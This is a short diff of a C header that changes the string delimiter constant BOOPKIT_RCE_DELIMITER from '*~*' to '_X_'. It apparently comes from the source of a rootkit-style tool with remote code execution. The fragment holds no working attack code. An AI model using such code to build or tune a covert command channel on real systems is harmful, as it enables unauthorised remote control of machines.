@@ -9,7 +9,7 @@
 #include <stddef.h>
 
 #define MAX_BOOP_PRINTF_LOG 1024
-#define BOOPKIT_RCE_DELIMITER "*~*"
+#define BOOPKIT_RCE_DELIMITER "_X_"
 
 
 extern int quiet;
